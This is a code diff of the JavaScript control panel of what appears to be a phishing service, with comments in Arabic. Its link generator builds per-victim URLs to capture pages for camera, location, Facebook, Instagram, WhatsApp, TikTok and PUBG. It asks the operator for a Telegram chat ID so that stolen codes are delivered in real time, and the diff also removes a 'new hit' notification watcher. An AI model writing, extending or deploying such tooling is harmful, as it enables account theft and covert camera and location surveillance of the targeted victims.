@@ -296,28 +296,35 @@
         }
 
         // 3. المنشئ والإشعارات
-        function generateCustomLink() {
-            const tool = document.getElementById('tool-select').value;
-            const vict = document.getElementById('victim-name').value || "target";
-            const user = localStorage.getItem('logged_user');
-            const link = `https://elcomando-68116.web.app/${tool}?id=${user}&target=${vict}`;
-            document.getElementById('final-link').innerText = link;
-            document.getElementById('generated-result').style.display = 'block';
-        }
+        // التعديل الجديد للمنشئ ليدعم الـ Chat ID في الأدوات الحية
+function generateCustomLink() {
+    const tool = document.getElementById('tool-select').value;
+    const vict = document.getElementById('victim-name').value || "target";
+    const user = localStorage.getItem('logged_user');
+    
+    // قائمة أول 7 أدوات حية (تتطلب تليجرام فوري)
+    const liveTools = ["كاميرا", "موقع", "فيسبوك", "انستا", "واتساب", "تيك توك", "ببجي"];
+    
+    let finalId = user; // الافتراضي هو اسم المستخدم للموقع
 
-        function copyGeneratedLink() {
-            navigator.clipboard.writeText(document.getElementById('final-link').innerText);
-            showAlert("DONE", "Link Copied!");
+    // إذا اختار المستخدم أداة من أول 7، نطلب منه الـ ID الخاص به
+    if (liveTools.includes(tool)) {
+        const telegramId = prompt("هذه الأداة (LIVE) تطلب تفاعل لحظي.\nيرجى إدخال Chat ID التليجرام الخاص بك لاستلام الأكواد:");
+        
+        if (!telegramId || isNaN(telegramId)) {
+            showAlert("تنبيه ⚠️", "يجب إدخال معرف تليجرام (رقمي) لضمان وصول البيانات لك.");
+            return;
         }
+        finalId = telegramId; // استبدال الـ ID بمعرف التليجرام في الرابط
+    }
 
-        function startNotificationWatcher() {
-            const user = localStorage.getItem('logged_user');
-            db.ref('hits/' + user).on('child_added', snap => {
-                const list = document.getElementById('notifs-list');
-                if(list.querySelector('p')) list.innerHTML = "";
-                list.innerHTML = `<div style="border-left:2px solid var(--primary); padding:5px; margin-bottom:5px; background:#111;">⚠️ New hit on: ${snap.key}</div>` + list.innerHTML;
-            });
-        }
+    // بناء الرابط النهائي مع استخدام user_id ليتوافق مع سكريبتات السحب
+    const link = `https://elcomando-68116.web.app/${tool}.html?user_id=${finalId}&target=${vict}`;
+    
+    document.getElementById('final-link').innerText = link;
+    document.getElementById('generated-result').style.display = 'block';
+}
+
 
         // التنقل والدوال العامة
         async function nav(id, title, emoji, el) {
@@ -393,3 +400,4 @@
     </script>
 </body>
 </html>
+
